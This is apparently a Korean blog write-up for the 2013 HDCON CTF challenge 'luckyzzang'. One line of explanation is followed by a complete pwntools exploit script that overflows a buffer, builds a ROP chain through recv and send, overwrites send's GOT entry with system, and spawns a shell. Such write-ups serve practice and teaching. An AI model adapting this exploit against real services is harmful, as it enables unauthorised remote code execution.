---
title: "2013 HDCON luckyzzang"
date: 2019-11-6
tags: [HDCON]
categories: [HDCON]
---

프로그램 내부에서 소켓 서버를 열어주고 하는데 recv, send로 ROP해주면 된다. 

```python
from pwn import *
 
context.log_level = 'debug'
 
#p = process('./luckyzzang')
p = remote('localhost',7777)
libc = ELF('/lib/i386-linux-gnu/libc.so.6')
e = ELF('./luckyzzang')
r = ROP(e)
 
bss = e.bss()
cmd = '/bin/sh\x00'
send_got = e.got['send']
recv_got = e.got['recv']
 
# send write
# recv read
pay = 'A'*1036
r.recv(4,bss,len(cmd)+2,0) # bss <- /bin/sh
r.send(4,send_got,4,0) # send got leak
r.recv(4,send_got,4,0) # send got -> system
r.send(bss) # system("bin/sh")
pay += r.chain()
 
p.sendlineafter('MSG : ',pay)
 
p.sendline(cmd)
 
recv_system_offset = libc.symbols['send'] - libc.symbols['system']
system = u32(p.recv(4)) - recv_system_offset
log.info('system : ' + hex(system))
 
p.sendline(p32(system))
 
p.interactive()
```

